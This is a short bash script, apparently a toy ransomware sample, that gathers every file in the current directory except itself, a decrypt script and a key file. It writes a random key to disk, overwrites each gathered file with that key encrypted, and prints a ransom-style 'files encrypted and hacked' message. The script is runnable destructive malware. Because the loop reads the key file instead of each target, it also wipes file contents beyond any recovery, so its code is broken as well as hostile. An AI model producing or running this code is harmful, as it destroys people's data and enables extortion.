#!/bin/bash

targets=()

for file in *; do

  if [ "$file" == "malware.sh" ] || [ "$file" == "decrypt.py" ] || [ "$file" == "thekey.key" ]; then
    continue

  fi

  if [ -f "$file" ]; then
     targets+=("$file")

  fi

done

echo "${targets[@]}"

key=$(openssl rand -base64 32)

echo "$key" > "thekey.key"

for file in "${targets[@]}"; do
  contents=$(cat thekey.key)
  contents_encrypted=$(echo "$contents" | openssl enc -aes-256-cbc -a -salt -pass pass:"$key")
  
  echo "$contents_encrypted" > "$file"

done

echo "ALL YOUR FILES HAVE BEEN ENCYRPTED AND HACKED!"
